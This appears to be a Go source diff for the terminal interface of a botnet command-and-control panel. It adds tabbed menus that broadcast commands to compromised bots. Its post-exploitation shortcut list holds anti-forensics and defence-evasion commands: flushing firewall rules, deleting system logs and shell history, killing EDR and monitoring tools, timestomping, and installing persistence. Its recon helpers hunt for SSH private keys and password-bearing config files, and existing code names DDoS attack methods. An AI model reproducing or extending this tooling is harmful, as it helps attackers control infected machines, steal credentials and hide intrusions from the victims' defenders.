@@ -160,6 +160,45 @@ func isL7Method(cmd string) bool {
 	return cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass" || cmd == "!rapidreset"
 }
 
+// broadcastShortcut is a pre-built command for the broadcast shortcuts panel
+type broadcastShortcut struct {
+	name string
+	desc string
+	cmd  string
+}
+
+// Post-exploitation shortcuts — general quick actions
+var postExShortcuts = []broadcastShortcut{
+	{"Persist All", "Install cron/startup persistence", "!persist"},
+	{"Reinstall All", "Force re-download bot binary", "!reinstall"},
+	{"Flush Firewall", "Drop all iptables rules", "iptables -F && iptables -X && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT"},
+	{"Kill Logging", "Stop syslog and clear logs", "service rsyslog stop 2>/dev/null; service syslog-ng stop 2>/dev/null; rm -rf /var/log/*.log /var/log/syslog /var/log/auth.log"},
+	{"Clear History", "Wipe shell history + unset", "history -c; rm -f ~/.bash_history ~/.zsh_history; unset HISTFILE HISTSIZE"},
+	{"Kill Monitors", "Stop common EDR/monitoring", "pkill -9 -f 'auditd|ossec|wazuh|falcon|sysdig|tcpdump|wireshark' 2>/dev/null"},
+	{"Disable Cron", "Stop cron daemon (anti-cleanup)", "service cron stop 2>/dev/null; service crond stop 2>/dev/null"},
+	{"Timestomp", "Set file timestamps to 2023", "find /tmp -maxdepth 1 -newer /etc/hostname -exec touch -t 202301010000 {} \\;"},
+	{"DNS Flush", "Clear DNS resolver cache", "resolvectl flush-caches 2>/dev/null; systemd-resolve --flush-caches 2>/dev/null; nscd -i hosts 2>/dev/null"},
+	{"Kill Sysmon", "Stop sysmon for linux", "service sysmonforlinux stop 2>/dev/null; pkill -9 sysmon 2>/dev/null"},
+}
+
+// Linux post-exploitation recon helpers
+var linuxHelpers = []broadcastShortcut{
+	{"System Info", "OS, kernel, hostname", "uname -a; cat /etc/*release 2>/dev/null | head -5; hostname"},
+	{"Network Info", "Interfaces, routes, DNS", "ip -br a; ip route show default; cat /etc/resolv.conf 2>/dev/null | grep nameserver"},
+	{"Open Ports", "Listening ports and PIDs", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"},
+	{"Users w/ Shell", "Accounts with login shell", "grep -v -E 'nologin|false|sync|halt|shutdown' /etc/passwd"},
+	{"SUID Binaries", "Find setuid executables", "find / -perm -4000 -type f 2>/dev/null"},
+	{"Writable Dirs", "World-writable directories", "find / -writable -type d 2>/dev/null | grep -v proc | head -20"},
+	{"Cron Jobs", "All scheduled tasks", "crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null"},
+	{"Docker/LXC", "Container environment check", "docker ps 2>/dev/null; lxc list 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -5"},
+	{"SSH Keys", "Find private keys on disk", "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null"},
+	{"Credentials", "Config files with passwords", "grep -rl 'password\\|passwd\\|credential' /etc/ /opt/ /var/www/ 2>/dev/null | head -15"},
+	{"Sudo Check", "Sudo permissions for user", "sudo -l 2>/dev/null; cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'"},
+	{"Proc Tree", "Running process tree", "ps auxf --width 200 2>/dev/null | head -30 || ps aux | head -30"},
+	{"Kernel Version", "Kernel + possible exploits", "uname -r; cat /proc/version"},
+	{"Mount Points", "Mounted filesystems", "mount | grep -v -E 'proc|sys|cgroup|tmpfs'"},
+}
+
 // TUIAttack tracks attacks launched from TUI mode
 type TUIAttack struct {
 	ID       int
@@ -239,11 +278,19 @@ type TUIModel struct {
 	broadcastArch    string // Filter by architecture (empty = all)
 	broadcastMinRAM  int64  // Minimum RAM in MB (0 = no filter)
 	broadcastMaxBots int    // Max bots to target (0 = all)
+	broadcastTab     int    // 0 = Command, 1 = Shortcuts, 2 = Linux
+	shortcutCursor   int    // Cursor position in shortcuts/linux lists
+
+	// Remote shell tabs (Shell / Linux helpers)
+	remoteShellTab     int // 0 = Shell, 1 = Linux helpers
+	remoteShortcutCur  int // Cursor in linux helpers list
 
 	// Confirmation prompts
-	confirmKill      bool // Waiting for kill confirmation
-	confirmPersist   bool // Waiting for persist confirmation (broadcast)
-	confirmReinstall bool // Waiting for reinstall confirmation (broadcast)
+	confirmKill         bool   // Waiting for kill confirmation
+	confirmPersist      bool   // Waiting for persist confirmation (broadcast)
+	confirmReinstall    bool   // Waiting for reinstall confirmation (broadcast)
+	confirmBroadcast    bool   // Waiting for generic broadcast confirmation
+	pendingBroadcastCmd string // Command pending broadcast confirmation
 
 	// Help section navigation
 	helpSection int // Current help section (0-8)
@@ -423,10 +470,186 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 
 	// Handle shell input mode
 	if m.currentView == ViewRemoteShell || m.currentView == ViewBroadcastShell {
+
+		// Handle any active confirmation prompt first (y/n only)
+		if m.confirmBroadcast || m.confirmPersist || m.confirmReinstall || m.confirmKill {
+			switch key {
+			case "y", "Y":
+				if m.confirmKill && m.currentView == ViewRemoteShell {
+					m.confirmKill = false
+					m.shellInput = "!lolnogtfo"
+					return m.executeShellCommand()
+				}
+				if m.confirmBroadcast && m.currentView == ViewBroadcastShell {
+					return m.executeBroadcastConfirmed()
+				}
+				if m.confirmPersist && m.currentView == ViewBroadcastShell {
+					m.confirmPersist = false
+					m.pendingBroadcastCmd = "!persist"
+					m.confirmBroadcast = true
+					return m, nil
+				}
+				if m.confirmReinstall && m.currentView == ViewBroadcastShell {
+					m.confirmReinstall = false
+					m.pendingBroadcastCmd = "!reinstall"
+					m.confirmBroadcast = true
+					return m, nil
+				}
+			case "n", "N", "esc":
+				if m.confirmKill {
+					m.confirmKill = false
+					m.shellOutput = append(m.shellOutput, lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  [kill cancelled]"))
+				}
+				m.confirmBroadcast = false
+				m.confirmPersist = false
+				m.confirmReinstall = false
+				m.pendingBroadcastCmd = ""
+			}
+			return m, nil
+		}
+
+		// Remote shell: left/right switches tabs (Shell / Linux)
+		if m.currentView == ViewRemoteShell {
+			if key == "left" {
+				if m.remoteShellTab > 0 {
+					m.remoteShellTab--
+					m.remoteShortcutCur = 0
+				}
+				return m, nil
+			}
+			if key == "right" {
+				if m.remoteShellTab < 1 {
+					m.remoteShellTab++
+					m.remoteShortcutCur = 0
+				}
+				return m, nil
+			}
+		}
+
+		// Remote shell: linux helpers tab uses cursor navigation
+		if m.currentView == ViewRemoteShell && m.remoteShellTab == 1 {
+			switch key {
+			case "esc":
+				m.currentView = ViewDashboard
+				m.remoteShellTab = 0
+				m.remoteShortcutCur = 0
+				return m, nil
+			case "up", "k":
+				if m.remoteShortcutCur > 0 {
+					m.remoteShortcutCur--
+				}
+				return m, nil
+			case "down", "j":
+				if m.remoteShortcutCur < len(linuxHelpers)-1 {
+					m.remoteShortcutCur++
+				}
+				return m, nil
+			case "enter":
+				// Execute selected helper on this bot
+				if m.remoteShortcutCur < len(linuxHelpers) {
+					selected := linuxHelpers[m.remoteShortcutCur]
+					m.shellInput = selected.cmd
+					m.remoteShellTab = 0 // Switch back to shell to see output
+					return m.executeShellCommand()
+				}
+				return m, nil
+			}
+			return m, nil
+		}
+
+		// Broadcast shell: left/right switches tabs (Command / Shortcuts / Linux)
+		if m.currentView == ViewBroadcastShell {
+			if key == "left" {
+				if m.broadcastTab > 0 {
+					m.broadcastTab--
+					m.shortcutCursor = 0
+				}
+				return m, nil
+			}
+			if key == "right" {
+				if m.broadcastTab < 2 {
+					m.broadcastTab++
+					m.shortcutCursor = 0
+				}
+				return m, nil
+			}
+		}
+
+		// Broadcast shell: shortcut/linux tabs use cursor navigation + enter to execute
+		if m.currentView == ViewBroadcastShell && m.broadcastTab > 0 {
+			var list []broadcastShortcut
+			if m.broadcastTab == 1 {
+				list = postExShortcuts
+			} else {
+				list = linuxHelpers
+			}
+
+			switch key {
+			case "esc":
+				m.currentView = ViewDashboard
+				m.broadcastTab = 0
+				m.shortcutCursor = 0
+				return m, nil
+			case "up", "k":
+				if m.shortcutCursor > 0 {
+					m.shortcutCursor--
+				}
+				return m, nil
+			case "down", "j":
+				if m.shortcutCursor < len(list)-1 {
+					m.shortcutCursor++
+				}
+				return m, nil
+			case "enter":
+				if m.shortcutCursor < len(list) {
+					selected := list[m.shortcutCursor]
+					m.shellInput = selected.cmd
+					return m.executeShellCommand()
+				}
+				return m, nil
+			case "ctrl+a":
+				archs := []string{"", "x86_64", "aarch64", "arm", "mips", "mipsel"}
+				currentIdx := 0
+				for i, a := range archs {
+					if a == m.broadcastArch {
+						currentIdx = i
+						break
+					}
+				}
+				m.broadcastArch = archs[(currentIdx+1)%len(archs)]
+				return m, nil
+			case "ctrl+g":
+				ramLevels := []int64{0, 512, 1024, 2048, 4096}
+				currentIdx := 0
+				for i, r := range ramLevels {
+					if r == m.broadcastMinRAM {
+						currentIdx = i
+						break
+					}
+				}
+				m.broadcastMinRAM = ramLevels[(currentIdx+1)%len(ramLevels)]
+				return m, nil
+			case "ctrl+n":
+				maxLevels := []int{0, 10, 50, 100, 500}
+				currentIdx := 0
+				for i, n := range maxLevels {
+					if n == m.broadcastMaxBots {
+						currentIdx = i
+						break
+					}
+				}
+				m.broadcastMaxBots = maxLevels[(currentIdx+1)%len(maxLevels)]
+				return m, nil
+			}
+			return m, nil
+		}
+
 		switch key {
 		case "esc":
 			m.currentView = ViewDashboard
 			m.shellInput = ""
+			m.broadcastTab = 0
+			m.remoteShellTab = 0
 			return m, nil
 		case "enter":
 			if m.shellInput != "" {
@@ -439,7 +662,6 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			}
 			return m, nil
 		case "up":
-			// History navigation
 			if len(m.shellHistory) > 0 && m.historyCursor > 0 {
 				m.historyCursor--
 				m.shellInput = m.shellHistory[m.historyCursor]
@@ -455,11 +677,9 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			}
 			return m, nil
 		case "ctrl+f":
-			// Clear output
 			m.shellOutput = []string{}
 			return m, nil
 		case "ctrl+p":
-			// Send !persist - with confirmation for broadcast
 			if m.currentView == ViewBroadcastShell {
 				m.confirmPersist = true
 				return m, nil
@@ -467,7 +687,6 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			m.shellInput = "!persist"
 			return m.executeShellCommand()
 		case "ctrl+r":
-			// Send !reinstall - with confirmation for broadcast
 			if m.currentView == ViewBroadcastShell {
 				m.confirmReinstall = true
 				return m, nil
@@ -475,57 +694,11 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			m.shellInput = "!reinstall"
 			return m.executeShellCommand()
 		case "ctrl+x":
-			// Trigger kill confirmation - only for single bot
 			if m.currentView == ViewRemoteShell {
 				m.confirmKill = true
 			}
 			return m, nil
-		case "y", "Y":
-			// Confirm kill
-			if m.confirmKill && m.currentView == ViewRemoteShell {
-				m.confirmKill = false
-				m.shellInput = "!lolnogtfo"
-				return m.executeShellCommand()
-			}
-			// Confirm persist broadcast
-			if m.confirmPersist && m.currentView == ViewBroadcastShell {
-				m.confirmPersist = false
-				m.shellInput = "!persist"
-				return m.executeShellCommand()
-			}
-			// Confirm reinstall broadcast
-			if m.confirmReinstall && m.currentView == ViewBroadcastShell {
-				m.confirmReinstall = false
-				m.shellInput = "!reinstall"
-				return m.executeShellCommand()
-			}
-			// Otherwise treat as normal input
-			m.shellInput += key
-			return m, nil
-		case "n", "N":
-			// Cancel kill confirmation
-			if m.confirmKill {
-				m.confirmKill = false
-				m.shellOutput = append(m.shellOutput, lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  [kill cancelled]"))
-				return m, nil
-			}
-			// Cancel persist confirmation
-			if m.confirmPersist {
-				m.confirmPersist = false
-				m.shellOutput = append(m.shellOutput, lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  [persist cancelled]"))
-				return m, nil
-			}
-			// Cancel reinstall confirmation
-			if m.confirmReinstall {
-				m.confirmReinstall = false
-				m.shellOutput = append(m.shellOutput, lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  [reinstall cancelled]"))
-				return m, nil
-			}
-			// Otherwise treat as normal input
-			m.shellInput += key
-			return m, nil
 		case "ctrl+a":
-			// Toggle arch filter (broadcast only)
 			if m.currentView == ViewBroadcastShell {
 				archs := []string{"", "x86_64", "aarch64", "arm", "mips", "mipsel"}
 				currentIdx := 0
@@ -539,7 +712,6 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			}
 			return m, nil
 		case "ctrl+g":
-			// Cycle min RAM filter (broadcast only) - using ctrl+g since ctrl+m = enter
 			if m.currentView == ViewBroadcastShell {
 				ramLevels := []int64{0, 512, 1024, 2048, 4096}
 				currentIdx := 0
@@ -553,7 +725,6 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			}
 			return m, nil
 		case "ctrl+n":
-			// Cycle max bots filter (broadcast only)
 			if m.currentView == ViewBroadcastShell {
 				maxLevels := []int{0, 10, 50, 100, 500}
 				currentIdx := 0
@@ -567,7 +738,6 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			}
 			return m, nil
 		default:
-			// Add character to shell input
 			if len(key) == 1 || key == "space" {
 				if key == "space" {
 					key = " "
@@ -931,6 +1101,8 @@ func (m TUIModel) handleEnter() (tea.Model, tea.Cmd) {
 			m.shellOutput = []string{}
 			m.shellInput = ""
 			m.selectedBot = ""
+			m.broadcastTab = 0
+			m.shortcutCursor = 0
 		case 3: // Socks Manager
 			m.currentView = ViewSocks
 			m.socksInputMode = false
@@ -965,6 +1137,8 @@ func (m TUIModel) handleEnter() (tea.Model, tea.Cmd) {
 			m.shellInput = ""
 			m.shellHistory = []string{}
 			m.historyCursor = 0
+			m.remoteShellTab = 0
+			m.remoteShortcutCur = 0
 			m.currentView = ViewRemoteShell
 		}
 	}
@@ -1088,44 +1262,63 @@ func (m TUIModel) executeShellCommand() (tea.Model, tea.Cmd) {
 
 	cmd := m.shellInput
 
+	if m.currentView == ViewRemoteShell && m.selectedBot != "" {
+		// Single bot — send immediately
+		m.shellHistory = append(m.shellHistory, cmd)
+		m.historyCursor = len(m.shellHistory)
+
+		prompt := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("$")
+		m.shellOutput = append(m.shellOutput, prompt+" "+cmd)
+
+		fullCmd := fmt.Sprintf("!shell %s", cmd)
+		sendToSingleBot(m.selectedBot, fullCmd)
+		m.shellInput = ""
+		return m, nil
+	}
+
+	if m.currentView == ViewBroadcastShell {
+		// Broadcast — require confirmation first
+		m.pendingBroadcastCmd = cmd
+		m.confirmBroadcast = true
+		m.shellInput = ""
+		return m, nil
+	}
+
+	m.shellInput = ""
+	return m, nil
+}
+
+// executeBroadcastConfirmed actually sends the pending broadcast command after confirmation
+func (m TUIModel) executeBroadcastConfirmed() (tea.Model, tea.Cmd) {
+	cmd := m.pendingBroadcastCmd
+	m.confirmBroadcast = false
+	m.pendingBroadcastCmd = ""
+
+	if cmd == "" {
+		return m, nil
+	}
+
 	// Add to history
 	m.shellHistory = append(m.shellHistory, cmd)
 	m.historyCursor = len(m.shellHistory)
 
-	// Show command in output
-	prompt := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("$")
-	m.shellOutput = append(m.shellOutput, prompt+" "+cmd)
-
-	if m.currentView == ViewRemoteShell && m.selectedBot != "" {
-		// Send to specific bot
-		fullCmd := fmt.Sprintf("!shell %s", cmd)
-		sendToSingleBot(m.selectedBot, fullCmd)
-	} else if m.currentView == ViewBroadcastShell {
-		// Broadcast with filters (detached)
-		fullCmd := fmt.Sprintf("!exec %s", cmd)
-		sentCount := sendToFilteredBots(fullCmd, m.broadcastArch, m.broadcastMinRAM, m.broadcastMaxBots)
-
-		// Build filter description
-		filterInfo := ""
-		if m.broadcastArch != "" || m.broadcastMinRAM > 0 || m.broadcastMaxBots > 0 {
-			filters := []string{}
-			if m.broadcastArch != "" {
-				filters = append(filters, fmt.Sprintf("arch=%s", m.broadcastArch))
-			}
-			if m.broadcastMinRAM > 0 {
-				filters = append(filters, fmt.Sprintf("≥%dMB", m.broadcastMinRAM))
-			}
-			if m.broadcastMaxBots > 0 {
-				filters = append(filters, fmt.Sprintf("≤%d", m.broadcastMaxBots))
-			}
-			filterInfo = fmt.Sprintf(" (%s)", strings.Join(filters, ", "))
-		}
-
-		m.shellOutput = append(m.shellOutput, lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render(
-			fmt.Sprintf("  [broadcast sent to %d bots%s]", sentCount, filterInfo)))
+	// Build the actual command
+	var fullCmd string
+	if strings.HasPrefix(cmd, "!") {
+		fullCmd = cmd
+	} else {
+		fullCmd = fmt.Sprintf("!detach %s", cmd)
 	}
+	sentCount := sendToFilteredBots(fullCmd, m.broadcastArch, m.broadcastMinRAM, m.broadcastMaxBots)
 
-	m.shellInput = ""
+	// Toast notification
+	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
+	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
+	m.toastMessage = neonGreen.Render("📡") + " " +
+		neonCyan.Render(cmd) + " " +
+		neonGreen.Render(fmt.Sprintf("→ %d bots", sentCount))
+	m.toastExpiry = time.Now().Add(3 * time.Second)
+
 	return m, nil
 }
 
@@ -2194,61 +2387,91 @@ func (m TUIModel) viewRemoteShell() string {
 
 	// Header with bot info
 	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
+	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
 	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
 	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
 	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
+	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))
 
 	b.WriteString(headerStyle.Render("  💻 REMOTE SHELL"))
 	b.WriteString("\n")
+
+	// Tab bar
+	remoteTabs := []string{"Shell", "Linux"}
+	for i, tab := range remoteTabs {
+		if i == m.remoteShellTab {
+			b.WriteString(neonCyan.Bold(true).Render(" [" + tab + "] "))
+		} else {
+			b.WriteString(dim.Render("  " + tab + "  "))
+		}
+	}
+	b.WriteString("\n")
+
 	b.WriteString(fmt.Sprintf("  %s %s %s %s\n",
 		dim.Render("Bot:"),
 		neonCyan.Render(truncate(m.selectedBot, 20)),
 		dim.Render("│ Arch:"),
 		neonYellow.Render(m.selectedBotArch)))
-	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────"))
+	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
 	b.WriteString("\n\n")
 
-	// Output area (scrollable)
-	outputHeight := 15
-	startIdx := 0
-	if len(m.shellOutput) > outputHeight {
-		startIdx = len(m.shellOutput) - outputHeight
-	}
+	switch m.remoteShellTab {
+	case 0: // Shell tab
+		// Output area (scrollable)
+		outputHeight := 13
+		startIdx := 0
+		if len(m.shellOutput) > outputHeight {
+			startIdx = len(m.shellOutput) - outputHeight
+		}
 
-	for i := startIdx; i < len(m.shellOutput); i++ {
-		b.WriteString("  " + m.shellOutput[i] + "\n")
-	}
+		for i := startIdx; i < len(m.shellOutput); i++ {
+			b.WriteString("  " + m.shellOutput[i] + "\n")
+		}
 
-	// Pad if less output
-	for i := len(m.shellOutput); i < outputHeight; i++ {
+		for i := len(m.shellOutput); i < outputHeight; i++ {
+			b.WriteString("\n")
+		}
+
+		b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
 		b.WriteString("\n")
-	}
 
-	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────"))
-	b.WriteString("\n")
+		if m.confirmKill {
+			warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Bold(true)
+			b.WriteString(warnStyle.Render("  ⚠️  KILL BOT? This will remove the bot permanently!"))
+			b.WriteString("\n")
+			b.WriteString(fmt.Sprintf("  %s Yes  %s No\n",
+				neonGreen.Render("[y]"),
+				lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("[n]")))
+		} else {
+			prompt := neonGreen.Render("  $ ")
+			cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("█")
+			b.WriteString(prompt + m.shellInput + cursor)
+			b.WriteString("\n\n")
 
-	// Input prompt or confirmation prompt
-	if m.confirmKill {
-		// Show kill confirmation
-		warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Bold(true)
-		b.WriteString(warnStyle.Render("  ⚠️  KILL BOT? This will remove the bot permanently!"))
+			hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
+			b.WriteString(dim.Render("  [enter] Execute  [↑/↓] History  [←/→] Tab  [ctrl+f] Clear  [esc] Menu\n"))
+			b.WriteString(fmt.Sprintf("  %s !persist  %s !reinstall  %s !kill\n",
+				hotkey.Render("[ctrl+p]"),
+				hotkey.Render("[ctrl+r]"),
+				hotkey.Render("[ctrl+x]")))
+		}
+
+	case 1: // Linux helpers tab
+		b.WriteString(neonGreen.Bold(true).Render("  🐧 LINUX RECON HELPERS"))
 		b.WriteString("\n")
-		b.WriteString(fmt.Sprintf("  %s Yes  %s No\n",
-			lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("[y]"),
-			lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("[n]")))
-	} else {
-		prompt := neonGreen.Render("  $ ")
-		cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("█")
-		b.WriteString(prompt + m.shellInput + cursor)
-		b.WriteString("\n\n")
+		b.WriteString(dim.Render("  Select and press Enter to run on this bot.") + "\n\n")
 
-		// Hotkey help
+		renderShortcutList(&b, linuxHelpers, m.remoteShortcutCur, neonPink, neonCyan, dim, white)
+
+		b.WriteString("\n")
+		b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
+		b.WriteString("\n")
 		hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
-		b.WriteString(dim.Render("  [enter] Execute  [↑/↓] History  [ctrl+f] Clear  [esc] Menu\n"))
-		b.WriteString(fmt.Sprintf("  %s !persist  %s !reinstall  %s !kill\n",
-			hotkey.Render("[ctrl+p]"),
-			hotkey.Render("[ctrl+r]"),
-			hotkey.Render("[ctrl+x]")))
+		b.WriteString(fmt.Sprintf("  %s Execute   %s Navigate   %s Tab   %s Menu\n",
+			hotkey.Render("[enter]"),
+			hotkey.Render("[↑/↓]"),
+			hotkey.Render("[←/→]"),
+			hotkey.Render("[esc]")))
 	}
 
 	return b.String()
@@ -2263,8 +2486,20 @@ func (m TUIModel) viewBroadcastShell() string {
 	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
 	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
 	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
+	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))
 
 	b.WriteString(headerStyle.Render("  📡 BROADCAST SHELL"))
+	b.WriteString("\n")
+
+	// Tab bar
+	tabs := []string{"Command", "Shortcuts", "Linux"}
+	for i, tab := range tabs {
+		if i == m.broadcastTab {
+			b.WriteString(neonCyan.Bold(true).Render(" [" + tab + "] "))
+		} else {
+			b.WriteString(dim.Render("  " + tab + "  "))
+		}
+	}
 	b.WriteString("\n")
 
 	// Targeting info - aligned layout
@@ -2289,58 +2524,172 @@ func (m TUIModel) viewBroadcastShell() string {
 	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
 	b.WriteString("\n\n")
 
-	// Output area
-	outputHeight := 12
-	startIdx := 0
-	if len(m.shellOutput) > outputHeight {
-		startIdx = len(m.shellOutput) - outputHeight
-	}
+	switch m.broadcastTab {
+	case 0: // Command tab
+		b.WriteString(dim.Render("  Commands run detached — no output returned.") + "\n\n")
 
-	for i := startIdx; i < len(m.shellOutput); i++ {
-		b.WriteString("  " + m.shellOutput[i] + "\n")
-	}
+		// Command history (last 8 commands)
+		historyStart := 0
+		if len(m.shellHistory) > 8 {
+			historyStart = len(m.shellHistory) - 8
+		}
+		if len(m.shellHistory) > 0 {
+			b.WriteString(dim.Render("  Recent") + "\n")
+			for i := historyStart; i < len(m.shellHistory); i++ {
+				b.WriteString(fmt.Sprintf("  %s %s\n",
+					neonPink.Render("»"),
+					white.Render(m.shellHistory[i])))
+			}
+		}
 
-	for i := len(m.shellOutput); i < outputHeight; i++ {
+		// Pad to keep layout stable
+		historyShown := len(m.shellHistory) - historyStart
+		if historyShown > 0 {
+			historyShown += 2 // label + info line
+		} else {
+			historyShown = 1 // info line
+		}
+		for i := historyShown; i < 11; i++ {
+			b.WriteString("\n")
+		}
+
+		b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
 		b.WriteString("\n")
-	}
 
-	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
-	b.WriteString("\n")
+		// Input prompt or confirmation
+		if m.confirmBroadcast || m.confirmPersist || m.confirmReinstall {
+			m.renderBroadcastConfirm(&b, neonGreen, neonRed, neonCyan, neonYellow, dim, white)
+		} else {
+			prompt := neonPink.Render("  » ")
+			cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("201")).Render("█")
+			b.WriteString(prompt + m.shellInput + cursor)
+			b.WriteString("\n\n")
 
-	// Input prompt or confirmation prompt
-	if m.confirmPersist {
-		warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true)
-		b.WriteString(warnStyle.Render("  ⚠️  BROADCAST !persist to ALL matching bots?"))
-		b.WriteString("\n")
-		b.WriteString(fmt.Sprintf("  %s Yes, install persistence   %s No, cancel\n",
-			neonGreen.Render("[y]"),
-			neonRed.Render("[n]")))
-	} else if m.confirmReinstall {
-		warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true)
-		b.WriteString(warnStyle.Render("  ⚠️  BROADCAST !reinstall to ALL matching bots?"))
-		b.WriteString("\n")
-		b.WriteString(fmt.Sprintf("  %s Yes, reinstall bots   %s No, cancel\n",
-			neonGreen.Render("[y]"),
-			neonRed.Render("[n]")))
-	} else {
-		prompt := neonPink.Render("  » ")
-		cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("201")).Render("█")
-		b.WriteString(prompt + m.shellInput + cursor)
+			hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
+			b.WriteString(dim.Render("  [enter] Send   [↑/↓] History   [←/→] Tab   [esc] Menu\n"))
+			b.WriteString(fmt.Sprintf("  %s !persist   %s !reinstall   %s Arch   %s RAM   %s Max\n",
+				hotkey.Render("[ctrl+p]"),
+				hotkey.Render("[ctrl+r]"),
+				hotkey.Render("[ctrl+a]"),
+				hotkey.Render("[ctrl+g]"),
+				hotkey.Render("[ctrl+n]")))
+		}
+
+	case 1: // Shortcuts tab
+		b.WriteString(neonRed.Bold(true).Render("  ⚡ POST-EXPLOITATION SHORTCUTS"))
 		b.WriteString("\n\n")
 
-		// Hotkey help - aligned
-		hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
-		b.WriteString(dim.Render("  [enter] Broadcast   [↑/↓] History   [ctrl+f] Clear   [esc] Menu\n"))
-		b.WriteString(fmt.Sprintf("  %s !persist    %s !reinstall\n",
-			hotkey.Render("[ctrl+p]"),
-			hotkey.Render("[ctrl+r]")))
-		b.WriteString(fmt.Sprintf("  %s Arch   %s RAM   %s Max Bots\n",
-			hotkey.Render("[ctrl+a]"),
-			hotkey.Render("[ctrl+g]"),
-			hotkey.Render("[ctrl+n]")))
+		renderShortcutList(&b, postExShortcuts, m.shortcutCursor, neonPink, neonCyan, dim, white)
+
+		b.WriteString("\n")
+		b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
+		b.WriteString("\n")
+		if m.confirmBroadcast {
+			m.renderBroadcastConfirm(&b, neonGreen, neonRed, neonCyan, neonYellow, dim, white)
+		} else {
+			hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
+			b.WriteString(fmt.Sprintf("  %s Execute   %s Navigate   %s Tab   %s Arch   %s RAM   %s Max\n",
+				hotkey.Render("[enter]"),
+				hotkey.Render("[↑/↓]"),
+				hotkey.Render("[←/→]"),
+				hotkey.Render("[ctrl+a]"),
+				hotkey.Render("[ctrl+g]"),
+				hotkey.Render("[ctrl+n]")))
+		}
+
+	case 2: // Linux tab
+		b.WriteString(neonGreen.Bold(true).Render("  🐧 LINUX RECON HELPERS"))
+		b.WriteString("\n\n")
+
+		renderShortcutList(&b, linuxHelpers, m.shortcutCursor, neonPink, neonCyan, dim, white)
+
+		b.WriteString("\n")
+		b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
+		b.WriteString("\n")
+		if m.confirmBroadcast {
+			m.renderBroadcastConfirm(&b, neonGreen, neonRed, neonCyan, neonYellow, dim, white)
+		} else {
+			hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
+			b.WriteString(fmt.Sprintf("  %s Execute   %s Navigate   %s Tab   %s Arch   %s RAM   %s Max\n",
+				hotkey.Render("[enter]"),
+				hotkey.Render("[↑/↓]"),
+				hotkey.Render("[←/→]"),
+				hotkey.Render("[ctrl+a]"),
+				hotkey.Render("[ctrl+g]"),
+				hotkey.Render("[ctrl+n]")))
+		}
 	}
 
 	return b.String()
+}
+
+// renderShortcutList renders a scrollable shortcut list with cursor highlight
+func renderShortcutList(b *strings.Builder, list []broadcastShortcut, cursor int,
+	neonPink, neonCyan, dim, white lipgloss.Style) {
